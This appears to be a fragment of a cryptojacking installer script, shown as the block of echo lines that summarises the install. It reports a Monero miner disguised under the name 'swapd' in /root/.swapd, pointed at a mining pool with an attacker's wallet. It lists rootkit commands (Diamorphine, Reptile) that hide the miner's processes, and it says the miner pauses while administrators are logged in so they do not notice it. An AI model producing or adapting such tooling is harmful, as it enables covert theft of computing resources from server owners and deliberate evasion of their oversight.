echo '  ✓ Miner renamed: 'swapd' (stealth binary name)'
echo '  ✓ Process hiding: Kernel rootkits ONLY (Diamorphine, Reptile, crypto-rootkit)'

echo ''
echo 'Installation Method:'
if [ "$USE_WGET" = true ]; then
    echo '  Download Tool: wget (curl SSL/TLS failed)'
else
    echo '  Download Tool: curl'
fi

echo ''
echo 'Mining Configuration:'
echo '  Binary:  /root/.swapd/swapd'
echo '  Config:  /root/.swapd/swapfile'
echo "  Wallet:  $WALLET"
echo '  Pool:    gulf.moneroocean.stream:80'

echo ''
echo 'Process Hiding Commands:'
echo '  Hide:    kill -31 $PID  (requires Diamorphine or crypto rootkit)'
echo '  Unhide:  kill -63 $PID  (requires Diamorphine)'
echo '  Reptile: reptile_cmd hide'

echo ''
echo '========================================================================='
echo '[*] Miner will auto-stop when admins login and restart when they logout'
echo '[*] All processes are hidden ONLY via kernel rootkits'
echo '[*] No userland hiding (no libhide, no mount tricks)'
echo '========================================================================='
